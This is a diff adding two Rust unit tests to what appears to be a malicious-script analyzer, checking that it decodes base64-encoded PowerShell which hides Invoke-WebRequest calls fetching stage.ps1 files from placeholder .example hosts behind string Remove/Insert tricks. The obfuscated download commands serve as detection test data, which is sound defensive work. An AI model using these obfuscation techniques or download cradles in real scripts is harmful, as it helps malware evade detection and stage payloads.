@@ -24150,6 +24150,78 @@ Clean '~~~{decoded}~~~' '~'"#
     }
 
     #[test]
+    fn ps1_literal_reordered_remove_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-remove-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Cut($unused,$value,$start,$count) {{
+  return $value.Remove($start,$count)
+}}
+Cut 0 '{}' 7 4"#,
+            decoded.replace("Invoke-", "Invoke-JUNK")
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-reordered-remove-extractor.example/stage.ps1"
+                )
+            }),
+            "literal reordered remove extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn ps1_literal_reordered_insert_extractor_call_recovers_nested_command() {
+        use base64::Engine;
+
+        let decoded =
+            "Invoke-WebRequest -Uri https://ps-reordered-insert-extractor.example/stage.ps1";
+        let inner = format!(
+            r#"function Add($unused,$value,$start,$text) {{
+  return $value.Insert($start,$text)
+}}
+Add 0 '{}' 6 '-'"#,
+            decoded.replace("Invoke-", "Invoke")
+        );
+        let b64 = base64::engine::general_purpose::STANDARD.encode(
+            inner
+                .encode_utf16()
+                .flat_map(|c| c.to_le_bytes())
+                .collect::<Vec<_>>(),
+        );
+        let script = format!("powershell -EncodedCommand {}\r\n", b64);
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, .. }
+                        if src == "https://ps-reordered-insert-extractor.example/stage.ps1"
+                )
+            }),
+            "literal reordered insert extractor call was not decoded: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn ps1_ireplace_literal_resolves_url() {
         let inner =
             r#"Invoke-WebRequest -Uri ('hxxps://ps-ireplace.example/stage' -ireplace 'xx','tt')"#;
